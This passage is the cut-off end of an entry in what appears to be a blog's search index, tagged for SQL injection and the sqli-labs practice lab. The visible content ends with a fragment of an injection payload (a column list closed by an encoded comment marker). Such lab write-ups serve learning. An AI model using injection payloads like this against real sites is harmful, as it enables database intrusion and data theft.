1,2,3,4,5%23]]></content>
      <tags>
        <tag>sql注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
</search>
